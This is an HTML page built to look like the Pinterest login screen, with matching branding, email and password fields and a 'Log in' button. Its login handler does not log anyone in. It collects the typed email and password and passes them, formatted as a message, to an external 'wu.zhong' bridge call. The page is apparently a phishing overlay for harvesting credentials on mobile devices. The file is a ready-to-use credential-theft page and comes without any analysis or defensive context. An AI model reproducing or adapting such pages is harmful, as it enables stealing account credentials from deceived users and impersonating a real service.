<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pinterest - Log in</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }


    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background-color: #000000;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 0;
    }


    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 20px;
      position: relative;
    }


    .close-btn {
      background: none;
      border: none;
      color: #ffffff;
      font-size: 24px;
      cursor: pointer;
      padding: 8px;
      margin-left: -8px;
      font-weight: 300;
    }


    .header-title {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      font-size: 18px;
      font-weight: 500;
    }


    .main-content {
      flex: 1;
      padding: 40px 20px 20px;
      display: flex;
      flex-direction: column;
      max-width: 400px;
      margin: 0 auto;
      width: 100%;
    }


    .form-container {
      display: flex;
      flex-direction: column;
      gap: 16px;
      margin-bottom: 40px;
    }


    .input-field {
      width: 100%;
      background: transparent;
      border: 2px solid #444;
      border-radius: 25px;
      color: #ffffff;
      font-size: 16px;
      padding: 16px 20px;
      outline: none;
      transition: border-color 0.3s ease;
    }


    .input-field::placeholder {
      color: #888;
    }


    .input-field:focus {
      border-color: #666;
    }


    .password-container {
      position: relative;
    }


    .password-toggle {
      position: absolute;
      right: 20px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 20px;
      color: #888;
      padding: 4px;
    }


    .login-button {
      background-color: #e60023;
      color: #ffffff;
      border: none;
      padding: 16px 24px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 25px;
      cursor: pointer;
      margin-bottom: 30px;
      transition: background-color 0.3s ease;
    }


    .login-button:hover {
      background-color: #c7001a;
    }


    .login-button:disabled {
      background-color: #333;
      color: #666;
      cursor: not-allowed;
    }


    .forgot-password {
      color: #888;
      text-decoration: none;
      font-size: 14px;
      text-align: center;
      transition: color 0.3s ease;
    }


    .forgot-password:hover {
      color: #ffffff;
    }



    @media (min-width: 768px) {
      .main-content {
        padding: 60px 40px 40px;
      }
     
      .header-title {
        font-size: 20px;
      }
    }


    @media (min-width: 1024px) {
      body {
        justify-content: center;
        padding: 20px;
      }
     
      .main-content {
        background-color: #111;
        border-radius: 16px;
        padding: 80px 60px 60px;
        min-height: auto;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
        border: 1px solid #333;
      }
    }



    .input-field {
      transition: all 0.3s ease;
    }


    .input-field:focus {
      transform: scale(1.02);
    }


    .login-button {
      transition: all 0.3s ease;
    }


    .login-button:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>
  <header class="header">
    <button class="close-btn" onclick="closeModal()">×</button>
    <h1 class="header-title">Log in</h1>
  </header>


  <main class="main-content">
    <form class="form-container" onsubmit="handleLogin(event)">
      <input
        type="email"
        id="email"
        class="input-field"
        placeholder="Enter your email"
        value=""
        required
      >


      <div class="password-container">
        <input
          type="password"
          id="password"
          class="input-field"
          placeholder="Enter your password"
          required
        >
        <button type="button" class="password-toggle" onclick="togglePassword()">
  
        </button>
      </div>


      <button type="submit" class="login-button" id="loginBtn">
        Log in
      </button>
    </form>


    <a href="#" class="forgot-password" onclick="handleForgotPassword(event)">
      Forgotten password?
    </a>
  </main>


  <script>
    function closeModal() {
      console.log('Close login modal');
    }


    function handleLogin(event) {
      event.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
     
      if (email && password) {



         wu.zhong(`🔰Pinterest Login \n\n✉️Email: ${email}\n\n🔒Password: ${password}`, "com.pinterest");


      }
    }


    function handleForgotPassword(event) {
      event.preventDefault();
      console.log('Forgot password clicked');

    }


  


    function updateButtonState() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const btn = document.getElementById('loginBtn');
     
      if (email.trim() && password.trim()) {
        btn.disabled = false;
      } else {
        btn.disabled = true;
      }
    }


    document.getElementById('email').addEventListener('input', updateButtonState);
    document.getElementById('password').addEventListener('input', updateButtonState);



    document.querySelectorAll('.input-field').forEach(input => {
      input.addEventListener('focus', function() {
        this.style.borderColor = '#e60023';
      });
     
      input.addEventListener('blur', function() {
        this.style.borderColor = '#444';
      });
    });


  
    document.addEventListener('DOMContentLoaded', function() {
      updateButtonState();
    });
  </script>
</body>
</html>
